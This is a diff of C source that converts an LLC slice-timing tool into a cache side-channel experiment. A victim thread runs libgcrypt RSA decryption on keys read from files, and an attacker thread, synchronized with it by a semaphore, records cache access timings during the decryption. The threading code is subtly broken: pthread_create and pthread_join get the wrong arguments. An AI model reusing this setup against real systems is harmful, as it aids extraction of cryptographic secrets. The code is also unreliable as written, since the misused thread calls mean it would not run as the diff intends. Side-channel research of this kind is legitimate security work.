@@ -1,13 +1,23 @@
-// See github.com/alireza/slice-aware
-
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <sched.h>
+#include <gcrypt.h>
+#include <inttypes.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 #include "./lib/memory-utils.c"
 #include "./lib/cache-utils.c"
-#include <sched.h>
-#include <inttypes.h>
-#include <stdlib.h>
+#include <semaphore.h>
+#include <pthread.h>
 
+#define NEED_GCRYPT_VERSION "1.5.0"
 #define NUMBER_CORES 8
-#define READ_TIMES 44
+#define READ_TIMES 256
+
+sem_t mutex;
 
 void CorePin(int coreID)
 {
@@ -20,36 +30,115 @@ void CorePin(int coreID)
 	}
 }
 
-int main(int argc, char **argv) {
+void* thread_victim(){
+	CorePin(2);
+    if (!gcry_check_version(NEED_GCRYPT_VERSION)){
+        fprintf (stderr, "libgcrypt is too old (need %s, have %s)\n",
+         NEED_GCRYPT_VERSION, gcry_check_version (NULL));
+        exit (2);
+    }
+
+    gcry_error_t err = 0;
+
+    /* We don't want to see any warnings, e.g. because we have not yet
+     parsed program options which might be used to suppress such
+     warnings. */
+    gcry_control (GCRYCTL_SUSPEND_SECMEM_WARN);
+
+    /* Allocate a pool of 16k secure memory. */
+    gcry_control (GCRYCTL_INIT_SECMEM, 16384, 0);
+
+    /* It is now okay to let Libgcrypt complain when there was/is
+        a problem with the secure memory. */
+    gcry_control (GCRYCTL_RESUME_SECMEM_WARN);
+
+    /* Tell Libgcrypt that initialization has completed. */
+    gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);
+
+    if (!gcry_control (GCRYCTL_INITIALIZATION_FINISHED_P))
+    {
+      fputs ("libgcrypt has not been initialized\n", stderr);
+      abort ();
+    }
+
+
+    char buf[2048], buf2[2048];
+    FILE *pubf = fopen("pubkey", "r");
+    fread(buf, 2048, 1, pubf);
+    fclose(pubf);
+    //printf("%s\n",buf);
+
+    gcry_sexp_t pubkey, pvtkey;
+
+    gcry_sexp_build(&pubkey, NULL, buf);
+    //gcry_sexp_dump(pubkey);
+
+    FILE *pvtf = fopen("pvtkey", "r");
+    fread(buf2, 2048, 1, pvtf);
+    fclose(pvtf);
+
+    gcry_sexp_build(&pvtkey, NULL, buf2);
+
+    /*
+    gcry_sexp_sprint(pubkey, GCRYSEXP_FMT_ADVANCED, buf2, 2047);
+    printf("%s\n",buf2);
+
+    gcry_sexp_sprint(pvtkey, GCRYSEXP_FMT_ADVANCED, buf2, 2047);
+    printf("%s\n",buf2);
+    */
+
+    const char* msg = "Hello World";
+    
+    gcry_sexp_t msgexp;
+    gcry_sexp_build(&msgexp, NULL, "(data (flags pkcs1) (value %s) )", msg);
+
+    gcry_sexp_t cipher;
+    err = gcry_pk_encrypt(&cipher, msgexp, pubkey);
+    if (err){
+        printf("encryption failed: %d\n", err);
+    }
+    
+    gcry_sexp_t cmsg = gcry_sexp_find_token(cipher, "a", 1);
+    
+    gcry_sexp_t ncipher;
+    gcry_sexp_build(&ncipher, NULL, "(enc-val (flags pkcs1) (rsa %S ) )", cmsg);
+    //gcry_sexp_dump(ncipher);
+
+    printf("start decrypt\n");
+	sem_post(&mutex);
+    gcry_sexp_t outmsg;
+    gcry_pk_decrypt(&outmsg, ncipher, pvtkey);
+
+    gcry_sexp_dump(outmsg);
+    pthread_exit(NULL);
+}
+
+void* thread_attacker() {
 
 	/*
 	 * Check arguments: should contain coreID and slice number
 	 */
 
-	if(argc!=3){
-		printf("Wrong Input! Enter desired slice and coreID!\n");
-		printf("Enter: %s <coreID> <sliceNumber>\n", argv[0]);
-		exit(1);
-	}
+	/*
+    pid_t cpid;
+    cpid = fork();
 
-	int coreID;
-	sscanf (argv[1],"%d",&coreID);
-	if(coreID > NUMBER_CORES*2-1 || coreID < 0){
-		printf("Wrong Core! CoreID should be less than %d and more than 0!\n", NUMBER_CORES);
-		exit(1);   
-	}
-
-	int desiredSlice;
-	sscanf (argv[2],"%d",&desiredSlice);
-	if(desiredSlice > NUMBER_SLICES-1 || desiredSlice < 0){
-		printf("Wrong slice! Slice should be less than %d and more than 0!\n", NUMBER_SLICES);
-		exit(1);   
-	}
-
+    if (cpid == 0){
+        //child process = victim
+        //CorePin(1);
+        int retval = main_victim();
+        return retval;
+    }
+	printf("hello from parent\n");
+	*/
 	/* 
 	 * Ping program to core-0 for finding chunks
 	 * Later the program will be pinned to the desired coreID
 	 */
+	int coreID;
+	int desiredSlice;
+	coreID=1;
+	desiredSlice=2;
 	CorePin(0);
 
 	/* Get a 1GB-hugepage */
@@ -115,7 +204,8 @@ int main(int argc, char **argv) {
     CorePin(coreID);
 
 	unsigned char *slice;
-
+	sem_wait(&mutex);
+	printf("Start measuring\n");
 	for(k=0;k<READ_TIMES;k++) {
 		/* Fill Arrays */
 		for(i=0; i<nTotalChunks;i++) {
@@ -174,7 +264,7 @@ int main(int argc, char **argv) {
 			time1= (((uint64_t)cycles_high << 32) | cycles_low);
 			time2= (((uint64_t)cycles_high1 << 32) | cycles_low1);
 			/* Print LLC Access Time */
-			printf("%lu\n", time2-time1);
+			printf("%lu \t %lu\n", time2-time1, time1);
 		}
 
 	}
@@ -184,5 +274,26 @@ int main(int argc, char **argv) {
 	free(totalChunks);
 	free(totalChunksPhysical);
 
-	return 0;
+	pthread_exit(NULL);
+}
+
+int main(int argc, char **argv){
+    
+    //shared exit flag
+    //short *exited;
+    //exited = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED, -1, 0);
+    //*exited = 0;
+
+	//sem_t sem_i, sem_f;
+	pthread_t thread_v, thread_a;
+	int errn;
+	errn = sem_init(&mutex, 0, 0);
+	//sem_getvalue(&sem_i, &errn);
+	pthread_create(thread_a, NULL, thread_attacker, NULL);
+	pthread_create(thread_v, NULL, thread_victim, NULL);
+	pthread_join(thread_victim,NULL); 
+    pthread_join(thread_attacker,NULL); 
+    sem_destroy(&mutex); 
+    return 0; 
+
 }
